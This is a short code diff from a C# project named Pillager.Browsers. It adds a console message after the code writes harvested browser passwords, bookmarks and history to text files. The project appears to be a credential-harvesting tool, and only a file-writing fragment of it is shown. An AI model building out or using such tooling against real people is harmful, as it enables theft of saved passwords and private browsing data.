@@ -211,6 +211,7 @@ namespace Pillager.Browsers
             File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
             File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
             File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+            Console.WriteLine("Files wrote to " + path);
         }
     }
 }
